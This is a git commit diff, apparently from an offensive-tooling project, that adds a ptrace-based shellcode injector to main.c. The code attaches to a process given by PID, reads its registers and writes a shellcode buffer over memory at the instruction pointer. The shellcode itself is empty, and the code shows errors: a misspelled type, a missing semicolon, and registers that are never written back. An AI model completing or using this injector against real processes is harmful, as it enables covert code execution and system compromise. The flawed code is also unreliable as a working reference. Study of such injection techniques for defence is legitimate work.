01444a4f9176f3c2829aa65f18eb6632ec975763
Ivan Nikolsky <enty8080@gmail.com>
2020-11-28 18:27:35 +0300

    Update main.c

--- main.c
+++ main.c
@@ -6,6 +6,19 @@
 usigned char *shellcode =
     "";
 
+int inject_code(pid_t pid, unsigned char *src, void *dst, int len) {
+    int i;
+    uint32_t *s = (uint32_t *)src;
+    uint32_t *d = (uint32_t *)dst;
+    for (i = 0; i < len; i += 4, s++, d++) {
+        if ((ptrace(PTRACE_POKETEXT, pid, d, *s)) < 0) {
+            perror("ptrace(POKETEXT):");
+            return -1;
+        }
+    }
+    return 0;
+}
+
 int main(int argc, char *argv[]) 
 {
     pid_t target;
@@ -18,5 +31,20 @@ int main(int argc, char *argv[])
         exit(1);
     }
     target = atoi(argv[1]);
+    printf("[*] Tracing process %d...\n", target);
+    if ((ptrace(PTRACE_ATTACH, target, NULL, NULL)) < 0) {
+        perror("ptrace(ATTACH):");
+        exit(1)
+    }
+    printf("[*] Waiting for process...\n");
+    wait(NULL);
+    printf("[*] Getting registers...\n");
+    if ((ptrace(PTRACE_GETREGS, target, NULL, &regs)) < 0) {
+        perror("ptrace(GETREGS):");
+        exit(1);
+    }
+    printf("[*] Injecting shellcode to %p\n", (void *)regs.rip);
+    inject_code(target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);
+    regs.rip += 2;
     return 0;
 }
